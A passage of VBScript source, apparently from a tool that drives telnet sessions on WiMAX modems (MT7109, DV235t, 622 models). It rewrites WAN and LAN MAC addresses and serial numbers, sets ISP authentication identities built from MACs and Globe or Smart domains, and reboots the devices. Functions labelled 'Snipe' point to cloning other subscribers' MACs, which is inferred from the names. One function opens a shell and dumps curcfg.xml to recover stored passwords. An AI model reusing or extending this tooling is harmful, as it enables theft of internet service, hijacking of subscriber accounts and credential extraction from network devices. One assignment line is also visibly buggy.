Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"router\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (Router)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wan mac " &UCase(macToTest) & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (Router)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"commit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (Router)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"exit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wimax\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth username " &authUserName & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &authUserPass & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth a-id " &naiUserName & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth auto-prepend enable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth ignore-cv enable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"commit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"exit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"reboot\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.Close
set objFSO = Nothing
Set Source = Nothing
End Sub
''TstCmndDSecurityGlobe END
''
''TstCmndDSecuritySmart BEGIN
Sub TstCmndDv235tSmartRebootSnipe(macToTest,macDomain)
macPassword = ""
macDomainOrig = macDomain
filenameInput =  "TelnetInputCmnd.txt"
tstInputCmndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameInput)
''isTTLS = True
''domainList = "@globetel.com.ph"
MyString = (Trim(macDomain))
MyArray = Split(MyString, ",", -1, 1)
MyArrayLength = UBound(MyArray) +1
''MsgBox MyArrayLength
''If macDomain = "@globelines.com.ph,TLS" Then
''If MyArrayLength = 2 Then
macDomain = MyArray(0)

''macPassword = "smart1_lancelot" ''Trim(generatePassword(macToTest)) 'userid and password
macPassword = macPassword = Trim(MyArray(2))
Sleeper 1000 
myNai=Replace(macToTest,":","")
Sleeper 1000
macNai =UCase(myNai)

authUserName = macPassword ''& macDomain  
authUserPass = macPassword
naiUserName = macNai & macDomain 
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"enable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"router\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (Router)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wan mac " &UCase(macToTest) & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (Router)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"commit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (Router)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"exit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wimax\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth username " &authUserName & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &authUserPass & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth a-id " &naiUserName & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth auto-prepend disable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth ignore-cv disable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"commit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"exit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"reboot\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.Close
set objFSO = Nothing
Set Source = Nothing
End Sub
''TstCmndDSecuritySmart END
''
''Checkdv235t REBOOT BEGIN
Function CheckDv235tAfterReboot
''attach line 9710
DisplayLogMacGenScan( "DV235t: Processing in approx. 75 seconds...." & vbCr & vbLf & "Device is Rebooting..." & vbCr & vbLf & "Waiting for the device...." )
Sleeper 75000 ''35000
''
liveCountHost = 0
telnetHostLive = False
Do 
Sleeper 3000
DisplayLogMacGenScan( "Waiting for the device is finish...." & vbCr & vbLf & "Trying to connect after reboot...")
telnetHostLive = Ping(Trim(inputTelnetHost.value))
'telnetHostLive = Ping("192.168.2.1")
If	telnetHostLive = False Then
liveCountHost = liveCountHost + 1
DisplayLogMacGenScan("Check try (" &liveCountHost & " of 15).")
Else
Exit Do
End If
If liveCountHost =2  Or liveCountHost =8  Or liveCountHost =13 Then
'MsgBox "Error on interface connecting not Updating"
DisplayLogMacGenScan("Retrying to connect...")
CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /release", 0, 1
Sleeper 5000
CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /renew", 0, 1
''
End If
If	liveCountHost >=15  Then
''telnetHostLive = True 
telnetHostLive = False 
'MsgBox telnetHostLive
End If
If hdnStopMacProcess.value = "1" Then
Sleeper(1000)
createTxtLogError LogContents.value
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
CheckDv235tAfterReboot = 0
Exit Function
End If
Loop While telnetHostLive = False
''listMacFile.Close
''If liveCountHost >= 16 Then
If telnetHostLive = False Then
DisplayLogMacGenScan("Connection Failed...." & vbCr & vbLf & "Process aborted....")
DisplayLogMacGenScan("WIMAX Device is NOT yet connected...")
DisplayLogMacGenScan "Tool Version: " & VersionAboutTool
createTxtLogError LogContents.value
hdnStopProcessResult.value = "1"
CheckDv235tAfterReboot = 0
MsgBox "WIMAX Device is NOT yet connected... process aborted.",16,"Connection Status"									
Exit Function
Else 
liveCountHost = 0
CheckDv235tAfterReboot = 1
'MsgBox "Connected"
DisplayLogMacGenScan("DV235t: Connection success!!! Ok....")
Sleeper 1000
''If SnipeMacRadioOption = "REBOOT" Then
''begin if stop by user
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan("Stopping process....Ok!")
Exit Function
End If
End if
End Function
''Checkdv235t REBOOT END
''
''dv235tglobeChangeSecurity END
''
''
''dv235tsmart BEGIN
Sub TstCmndDv235tSmartReboot(currentMac,tstInputCmndFile)	
authUserNameS = inputDomainPassword.value
authUserPassS = inputDomainPassword.value
naiUserNameS = inputNai.value & drpDwnNaiDomain.value
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"enable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"router\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (Router)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wan mac " &UCase(currentMac) & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (Router)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"commit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (Router)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"exit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wimax\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth username " &authUserNameS & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &authUserPassS & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth a-id " &naiUserNameS & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth auto-prepend disable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"wmx auth ignore-cv disable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"commit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109 (WiMax)#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"exit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"reboot\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.Close
set objFSO = Nothing
Set Source = Nothing
End Sub
''dv235tsmart END
''
''checkTELNETdv235t BEGIN
Sub TstCmndDv235tSnipeCheckTelnet(currentMac,tstInputCmndFile)	
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"enable\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"MT7109#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"logout\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Logout"& chr(34)&"")
Source.Close
set objFSO = Nothing
Set Source = Nothing
End Sub
''checkTELNETdv235t END
''
Sub TstCmnd621Reboot(currentMac,tstInputCmndFile)	
'MsgBox "Inside create Input command"
'changeMACLog.value = "Creating telnet input Command....."
'TextAreaScrollBottom(changeMACLog.name)
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"setmacaddr " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"board reboot\m"& chr(34)&"") 'RESTORE
Source.WriteLine ("WAIT "& chr(34) &"board reboot"& chr(34)&"") 'REBOOT
'Source.WriteLine ("WAIT "& chr(34) &"restoredef"& chr(34)&"") 'RESTORE
''Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
''uncoment below after test
'Source.WriteLine ("WAIT "& chr(34) &"Connection To"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
Sub TstCmnd622Restore(currentMac,tstInputCmndFile)	
'MsgBox "Inside create Input command"
'changeMACLog.value = "Creating telnet input Command....."
'TextAreaScrollBottom(changeMACLog.name)
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"setallmacaddr " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"restoredef\m"& chr(34)&"") 'RESTORE
Source.WriteLine ("WAIT "& chr(34) &"restoredef"& chr(34)&"") 'RESTORE
''Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
''uncoment below after test
'Source.WriteLine ("WAIT "& chr(34) &"Connection To"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
''
''begin 622 2011 REBOOT
Sub TstCmnd6222011Reboot(currentMac,tstInputCmndFile)
'MsgBox "Inside create Input command"
'changeMACLog.value = "Creating telnet input Command....."
'TextAreaScrollBottom(changeMACLog.name)
''serialNum = "500807778001023836"
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"xiugai allmacdizhi " &currentMac & "\m"& chr(34)&"")
''
If chkEnableChangeSerial.checked Then
serialNum = Trim(inputChangeSerial.value)
If serialNum <> "" And serialNum <> "Enter Serial here" Then
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"xiugai serialnum " &serialNum & "\m"& chr(34)&"")
End If
End If
''
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"board reboot\m"& chr(34)&"") 'RESTORE
Source.WriteLine ("WAIT "& chr(34) &"board reboot"& chr(34)&"") 'REBOOT
'Source.WriteLine ("WAIT "& chr(34) &"board reboot"& chr(34)&"") 'REBOOT
'Source.WriteLine ("WAIT "& chr(34) &"restoredef"& chr(34)&"") 'RESTORE
''Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
''uncoment below after test
'Source.WriteLine ("WAIT "& chr(34) &"Connection To"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
''end 622 2011 REBOOT
''
''
''begin 622 622m2012 REBOOT and RESTORE
Sub TstCmnd622m2012RebootRestore(currentMac,tstInputCmndFile)
currentMacAddOne = IncrementMacbyOne(currentMac)
wanMacEntry = Replace(currentMac ,":","")
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"sncfg dset WAN_MAC_ENCRY " &wanMacEntry & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"sncfg dset WAN_MAC " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"sncfg dset LAN_MAC " &currentMacAddOne & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"sncfg commit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"sncfg reload\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"reboot\m"& chr(34)&"") 
Source.WriteLine ("WAIT "& chr(34) &"#"& chr(34)&"") 
''Source.WriteLine ("WAIT "& chr(34) &"reboot"& chr(34)&"") 
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
''telnet is not disabled and security is autofill
''end 622m2012 REBOOT and RESTORE
''
''
''begin 622 622m2012 REBOOT and RESTORE SNipe
Sub TstCmnd622m2012RebootRestoreSnipe(currentMac,tstInputCmndFile)
currentMacAddOne = IncrementMacbyOne(currentMac)
wanMacEntry = Replace(currentMac ,":","")
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"sncfg dset WAN_MAC_ENCRY " &wanMacEntry & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"sncfg dset WAN_MAC " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"sncfg dset LAN_MAC " &currentMacAddOne & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"sncfg commit\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"sncfg reload\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"reboot\m"& chr(34)&"") 
Source.WriteLine ("WAIT "& chr(34) &"#"& chr(34)&"") 
''Source.WriteLine ("WAIT "& chr(34) &"reboot"& chr(34)&"") 
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
''telnet is not disabled and security is autofill
''end 622m2012 REBOOT and RESTORE SNIPE
''

Sub TstCmnd622Reboot(currentMac,tstInputCmndFile)	
'MsgBox "Inside create Input command"
'changeMACLog.value = "Creating telnet input Command....."
'TextAreaScrollBottom(changeMACLog.name)
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"setallmacaddr " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"board reboot\m"& chr(34)&"") 'RESTORE
Source.WriteLine ("WAIT "& chr(34) &"board reboot"& chr(34)&"") 'REBOOT
'Source.WriteLine ("WAIT "& chr(34) &"board reboot"& chr(34)&"") 'REBOOT
'Source.WriteLine ("WAIT "& chr(34) &"restoredef"& chr(34)&"") 'RESTORE
''Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
''uncoment below after test
'Source.WriteLine ("WAIT "& chr(34) &"Connection To"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
''
''Begin 622 2011 REBOOT SNIPE
Sub TstCmnd6222011RebootSnipe(currentMac,tstInputCmndFile)	
'MsgBox "Inside create Input command"
'changeMACLog.value = "Creating telnet input Command....."
'TextAreaScrollBottom(changeMACLog.name)
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"xiugai allmacdizhi " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"board reboot\m"& chr(34)&"") 'REBOOT
Source.WriteLine ("WAIT "& chr(34) &"board reboot"& chr(34)&"") 'REBOOT
'Source.WriteLine ("WAIT "& chr(34) &"board reboot"& chr(34)&"") 'REBOOT
'Source.WriteLine ("WAIT "& chr(34) &"restoredef"& chr(34)&"") 'RESTORE
''Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
''uncoment below after test
'Source.WriteLine ("WAIT "& chr(34) &"Connection To"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
''END 622 2011 REBOOT SNIPE
''
''
''Begin 622 2011 REBOOT SNIPE
Sub TstCmnd6222011GetPassWord(tstInputCmndFile)	
'MsgBox "Inside create Input command"
'changeMACLog.value = "Creating telnet input Command....."
'TextAreaScrollBottom(changeMACLog.name)
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"sh\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"sh"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"cd var\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"#"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"cat curcfg.xml\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"</InternetGatewayDeviceConfig>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"exit\m"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"exit\m"& chr(34)&"")
'Source.WriteLine ("WAIT "& chr(34) &"exit"& chr(34)&"") 'REBOOT
''Source.WriteLine ("WAIT "& chr(34) &"board reboot"& chr(34)&"") 'REBOOT
'Source.WriteLine ("WAIT "& chr(34) &"board reboot"& chr(34)&"") 'REBOOT
'Source.WriteLine ("WAIT "& chr(34) &"restoredef"& chr(34)&"") 'RESTORE
''Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
''uncoment below after test
'Source.WriteLine ("WAIT "& chr(34) &"Connection To"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
''END 622 2011 REBOOT SNIPE
''
Sub TstCmnd622RebootSnipe(currentMac,tstInputCmndFile)	
'MsgBox "Inside create Input command"
'changeMACLog.value = "Creating telnet input Command....."
'TextAreaScrollBottom(changeMACLog.name)
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"setallmacaddr " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"board reboot\m"& chr(34)&"") 'REBOOT
Source.WriteLine ("WAIT "& chr(34) &"board reboot"& chr(34)&"") 'REBOOT
'Source.WriteLine ("WAIT "& chr(34) &"board reboot"& chr(34)&"") 'REBOOT
'Source.WriteLine ("WAIT "& chr(34) &"restoredef"& chr(34)&"") 'RESTORE
''Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
''uncoment below after test
'Source.WriteLine ("WAIT "& chr(34) &"Connection To"& chr(34)&"")
Source.Close
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Create ok..."
set objFSO = Nothing
Set Source = Nothing
End Sub
Sub TstCmnd622RestoreFusion(currentMac,stableMac,tstInputCmndFile)	
'MsgBox "Inside create Input command"
'changeMACLog.value = "Creating telnet input Command....."
'TextAreaScrollBottom(changeMACLog.name)
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
